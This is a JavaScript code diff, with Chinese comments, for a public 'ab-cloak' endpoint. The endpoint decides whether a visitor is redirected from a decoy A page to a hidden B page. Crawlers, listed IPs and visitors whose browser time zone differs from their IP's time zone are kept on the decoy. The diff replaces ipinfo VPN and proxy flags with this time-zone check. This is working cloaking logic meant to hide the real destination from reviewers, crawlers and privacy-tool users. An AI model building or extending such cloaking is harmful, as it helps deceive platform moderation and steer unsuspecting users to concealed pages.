@@ -1,6 +1,6 @@
 // POST /api/ab-cloak — AB页斗篷判定（公开，无鉴权）
 // A页守卫脚本（根目录 ab-ck.js）在页面加载时调用此接口，
-// 服务端综合：白名单 → 爬虫UA → 设备 → 语言 → 时区 → IP黑名单 → VPN/代理(ipinfo)，
+// 服务端综合：白名单 → 爬虫UA → 设备 → 语言 → 时区 → IP黑名单 → 时区一致性(代理/VPN/机房)，
 // 返回 { redirect }：真实用户跳 b_url，爬虫/被屏蔽（命中规则）留在 A 页（redirect=null），无配置/未开通则 redirect=null。
 // 与既有斗篷(functions/api/cloak.js)完全独立，不复用其接口。
 
@@ -60,6 +60,45 @@ function tzMatch(list, offsetEast, iana) {
   return false;
 }
 
+// 时区 → 数字偏移（小时，东正）。ipinfo 返回的是 IANA 名称（如 Asia/Shanghai），
+// 这里统一换算成数字 ±N 再比较，避免中国有 asia/shanghai、asia/chongqing 等多个别名的困扰。
+// 未知时区返回 null（判定时按"一致"处理，fail-open）。
+function ianaOffset(iana) {
+  var t = String(iana || '').toLowerCase();
+  if (!t) return null;
+  var map = {
+    'utc': 0, 'gmt': 0, 'etc/utc': 0, 'etc/gmt': 0, 'zulu': 0,
+    // 中国 / 东亚（统一 +8，别名归一）
+    'asia/shanghai': 8, 'asia/chongqing': 8, 'asia/harbin': 8, 'asia/kashgar': 8, 'asia/urumqi': 8, 'prc': 8,
+    'asia/hong_kong': 8, 'asia/macau': 8, 'asia/taipei': 8, 'asia/singapore': 8, 'asia/kuala_lumpur': 8, 'asia/manila': 8, 'asia/brunei': 8,
+    'asia/tokyo': 9, 'asia/seoul': 9, 'asia/pyongyang': 9,
+    'asia/jakarta': 7, 'asia/pontianak': 7, 'asia/bangkok': 7, 'asia/ho_chi_minh': 7, 'asia/hanoi': 7, 'asia/saigon': 7,
+    'asia/dubai': 4, 'asia/muscat': 4, 'asia/riyadh': 3, 'asia/qatar': 3, 'asia/kuwait': 3, 'asia/bahrain': 3, 'asia/baghdad': 3, 'asia/tehran': 3.5,
+    'asia/kolkata': 5.5, 'asia/calcutta': 5.5, 'asia/colombo': 5.5, 'asia/kathmandu': 5.75,
+    'asia/dhaka': 6, 'asia/karachi': 5, 'asia/kabul': 4.5, 'asia/almaty': 6, 'asia/tashkent': 5,
+    // 欧洲
+    'europe/london': 0, 'europe/dublin': 0, 'europe/lisbon': 0, 'europe/reykjavik': 0,
+    'europe/madrid': 1, 'europe/paris': 1, 'europe/berlin': 1, 'europe/amsterdam': 1, 'europe/brussels': 1, 'europe/rome': 1, 'europe/zurich': 1, 'europe/vienna': 1, 'europe/prague': 1, 'europe/warsaw': 1, 'europe/stockholm': 1, 'europe/copenhagen': 1, 'europe/oslo': 1, 'europe/budapest': 1,
+    'europe/athens': 2, 'europe/helsinki': 2, 'europe/riga': 2, 'europe/tallinn': 2, 'europe/vilnius': 2, 'europe/sofia': 2, 'europe/bucharest': 2, 'europe/kiev': 2, 'europe/kyiv': 2,
+    'europe/istanbul': 3, 'europe/moscow': 3, 'europe/minsk': 3,
+    // 美洲
+    'america/new_york': -5, 'america/toronto': -5, 'america/detroit': -5, 'america/bogota': -5, 'america/lima': -5, 'america/panama': -5, 'america/quito': -5, 'america/jamaica': -5,
+    'america/chicago': -6, 'america/mexico_city': -6, 'america/winnipeg': -6, 'america/guatemala': -6,
+    'america/denver': -7, 'america/phoenix': -7, 'america/edmonton': -7,
+    'america/los_angeles': -8, 'america/vancouver': -8, 'america/tijuana': -8,
+    'america/anchorage': -9,
+    'america/sao_paulo': -3, 'america/argentina/buenos_aires': -3, 'america/santiago': -4, 'america/caracas': -4, 'america/halifax': -4, 'america/la_paz': -4, 'america/puerto_rico': -4, 'america/santo_domingo': -4,
+    'america/honolulu': -10, 'pacific/honolulu': -10,
+    // 大洋洲
+    'australia/sydney': 10, 'australia/melbourne': 10, 'australia/brisbane': 10, 'australia/canberra': 10, 'australia/hobart': 10,
+    'australia/perth': 8, 'australia/adelaide': 9.5, 'australia/darwin': 9.5,
+    'pacific/auckland': 12, 'pacific/fiji': 12, 'pacific/guam': 10, 'pacific/port_moresby': 10,
+    // 非洲
+    'africa/cairo': 2, 'africa/johannesburg': 2, 'africa/nairobi': 3, 'africa/lagos': 1, 'africa/casablanca': 1, 'africa/algiers': 1, 'africa/accra': 0
+  };
+  return (map[t] !== undefined) ? map[t] : null;
+}
+
 function evaluateRules(rules, ctx) {
   var r = rules || {};
   var triggered = [];
@@ -92,8 +131,13 @@ function evaluateRules(rules, ctx) {
     var ips = r.block_ips.list || [];
     if (ctx.ip && ips.indexOf(ctx.ip) !== -1) triggered.push('block_ips');
   }
-  if (on(r.vpn) && ctx.isVpn === true) triggered.push('vpn');
-  if (on(r.proxy) && ctx.isProxy === true) triggered.push('proxy');
+  // 代理 / VPN / 数据中心机房：浏览器时区偏移 vs IP 归属时区偏移（统一用数字 ±N 判断）
+  // 相差 > 1 小时 → 疑似代理/VPN/机房（1 小时容差吸收夏令时；兼容旧的 vpn/proxy 字段开关）
+  if (on(r.privacy) || on(r.vpn) || on(r.proxy)) {
+    var ipOff = ianaOffset(ctx.ipTz);
+    var clientOff = (typeof ctx.tzOffset === 'number') ? ctx.tzOffset : null;
+    if (ipOff !== null && clientOff !== null && Math.abs(clientOff - ipOff) > 1) triggered.push('privacy');
+  }
 
   // 行为模块（AB 页默认不启用，保留逻辑供扩展，落地即跳时无行为信号）
   if (on(b.scroll_depth)) {
@@ -118,7 +162,7 @@ function evaluateRules(rules, ctx) {
 
 async function getIpInfo(env, ip) {
   if (!ip || ip === '127.0.0.1' || ip === '::1') return null;
-  var cacheKey = 'ab:ipinfo:' + ip;
+  var cacheKey = 'ab:ipinfo:v2:' + ip;
   try {
     var cached = await env.kvadmin.get(cacheKey);
     if (cached) return JSON.parse(cached);
@@ -132,7 +176,7 @@ async function getIpInfo(env, ip) {
     clearTimeout(timer);
     if (!res.ok) return null;
     var data = await res.json();
-    var out = { vpn: !!(data.privacy && data.privacy.vpn), proxy: !!(data.privacy && data.proxy) };
+    var out = { timezone: data.timezone || '', country: data.country || '', region: data.region || '' };
     try { await env.kvadmin.put(cacheKey, JSON.stringify(out), { expirationTtl: 600 }); } catch (e) {}
     return out;
   } catch (e) { return null; }
@@ -228,15 +272,15 @@ export async function onRequest(context) {
     var whitelisted = Array.isArray(whitelist) && ip && whitelist.indexOf(ip) !== -1;
 
     var triggered = [];
-    var isVpn = false, isProxy = false;
+    var ipTz = '';
     if (!whitelisted) {
       var rules = config.rules || {};
-      var needIp = on(rules.vpn) || on(rules.proxy);
+      var needIp = on(rules.privacy) || on(rules.vpn) || on(rules.proxy);
       if (needIp) {
         var ipInfo = await getIpInfo(env, ip);
-        if (ipInfo) { isVpn = ipInfo.vpn; isProxy = ipInfo.proxy; }
+        if (ipInfo) { ipTz = ipInfo.timezone || ''; }
       }
-      triggered = evaluateRules(rules, { ip: ip, ua: ua, device: device, lang: clientLang, tzOffset: tzOffset, tzIANA: tzIANA, isVpn: isVpn, isProxy: isProxy });
+      triggered = evaluateRules(rules, { ip: ip, ua: ua, device: device, lang: clientLang, tzOffset: tzOffset, tzIANA: tzIANA, ipTz: ipTz });
     }
 
     var passed = triggered.length === 0;
@@ -244,7 +288,7 @@ export async function onRequest(context) {
     var redirect = passed ? (config.b_url || null) : null;
 
     // 记录流量（异步，不阻塞跳转响应；ab_traffic 表未建时静默跳过）
-    context.waitUntil(logTraffic(env, { a_url: config.a_url, username: config.username || '', ip: ip, device: device, lang: clientLang, timezone: tzIANA || (tzOffset !== null ? String(tzOffset) : ''), isVpn: isVpn, isProxy: isProxy, passed: passed, redirect: redirect, triggered: triggered, ua: ua }));
+    context.waitUntil(logTraffic(env, { a_url: config.a_url, username: config.username || '', ip: ip, device: device, lang: clientLang, timezone: tzIANA || (tzOffset !== null ? String(tzOffset) : ''), isVpn: false, isProxy: false, passed: passed, redirect: redirect, triggered: triggered, ua: ua }));
 
     return new Response(JSON.stringify({ redirect: redirect, passed: passed, triggered: triggered, whitelisted: whitelisted, _dbg: { a_url: config.a_url, username: config.username, device: device, ip: ip } }), { headers: jsonHeaders });
   } catch (e) {
